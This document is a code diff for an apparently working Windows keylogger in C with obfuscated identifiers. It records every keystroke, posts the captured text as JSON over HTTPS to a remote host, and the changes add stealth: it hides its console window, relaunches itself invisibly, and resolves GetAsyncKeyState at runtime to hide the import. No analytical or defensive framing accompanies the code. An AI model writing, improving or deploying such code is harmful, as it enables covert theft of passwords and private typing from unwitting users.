@@ -2,24 +2,29 @@
 #include <windows.h>
 #include <wininet.h>
 
-#define O1 2000
+#define O1 1024
+#define O2 0
 
-char V1[1024];
+char V1[O1];
 int V2 = 0;
 CRITICAL_SECTION V3;
+char* O3 = "example.com";
+
+typedef SHORT (WINAPI *F3)(int);
+F3 O4;
 
 void F1() {
     HINTERNET V4 = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (V4) {
-        HINTERNET V5 = InternetConnectA(V4, "domain.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        HINTERNET V5 = InternetConnectA(V4, O3, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
         if (V5) {
-            const char *O2 = "/data";
-            const char *O3 = "Content-Type: application/json";
-            HINTERNET V6 = HttpOpenRequestA(V5, "POST", O2, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
+            const char *O5 = "/data";
+            const char *O6 = "Content-Type: application/json";
+            HINTERNET V6 = HttpOpenRequestA(V5, "POST", O5, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
             if (V6) {
-                char V7[2048];
+                char V7[O1 + 128];
                 sprintf(V7, "{\"content\":\"%s\"}", V1);
-                if (!HttpSendRequestA(V6, O3, -1, V7, strlen(V7))) {
+                if (HttpSendRequestA(V6, O6, -1, V7, strlen(V7))) {
                 }
                 InternetCloseHandle(V6);
             }
@@ -27,22 +32,23 @@ void F1() {
         }
         InternetCloseHandle(V4);
     }
+
     EnterCriticalSection(&V3);
     V2 = 0;
     V1[0] = '\0';
     LeaveCriticalSection(&V3);
 }
 
-DWORD WINAPI F2(LPVOID O4) {
+DWORD WINAPI F2(LPVOID O7) {
     DWORD V8 = GetTickCount();
     while (1) {
         for (int V9 = 8; V9 <= 255; V9++) {
-            if (GetAsyncKeyState(V9) & 0x0001) {
+            if (O4(V9) & 0x0001) {
                 V8 = GetTickCount();
 
                 char V10[2] = {0, 0};
                 SHORT V11 = GetKeyState(VK_CAPITAL) & 0x0001;
-                SHORT V12 = GetAsyncKeyState(VK_SHIFT) & 0x8000;
+                SHORT V12 = O4(VK_SHIFT) & 0x8000;
 
                 if ((V9 >= 'A' && V9 <= 'Z')) {
                     if (V12 ^ V11) {
@@ -91,33 +97,58 @@ DWORD WINAPI F2(LPVOID O4) {
                         case VK_OEM_5: V10[0] = (V12) ? '|' : '\\'; break;
                         case VK_OEM_6: V10[0] = (V12) ? '}' : ']'; break;
                         case VK_OEM_7: V10[0] = (V12) ? '"' : '\''; break;
-                        default:
-                            continue;
+                        default: continue;
                     }
                 }
 
                 EnterCriticalSection(&V3);
-                strcat(V1, V10);
-                V2++;
+                if (V2 + 1 < O1) {
+                    strcat(V1, V10);
+                    V2++;
+                }
                 LeaveCriticalSection(&V3);
             }
         }
 
-        if (GetTickCount() - V8 >= O1) {
+        if (GetTickCount() - V8 >= O2) {
             if (V2 > 0) {
                 F1();
             }
             V8 = GetTickCount();
         }
 
-        Sleep(0);
+        Sleep(10);
     }
     return 0;
 }
 
+void StartHidden() {
+    char szPath[MAX_PATH];
+    GetModuleFileName(NULL, szPath, MAX_PATH);
+
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION pi;
+
+    CreateProcess(szPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
+
 int wmain() {
+    HWND V15 = GetConsoleWindow();
+    ShowWindow(V15, SW_HIDE);
+
+    if (GetConsoleWindow() != NULL) {
+        StartHidden();
+        return 0;
+    }
+
     DWORD V13;
     HANDLE V14;
+
+    O4 = (F3)GetProcAddress(GetModuleHandle(TEXT("user32.dll")), "GetAsyncKeyState");
 
     InitializeCriticalSection(&V3);
     V14 = CreateThread(NULL, 0, F2, NULL, 0, &V13);
@@ -125,4 +156,8 @@ int wmain() {
     DeleteCriticalSection(&V3);
     CloseHandle(V14);
     return 0;
+}
+
+int main() {
+    return wmain();
 }
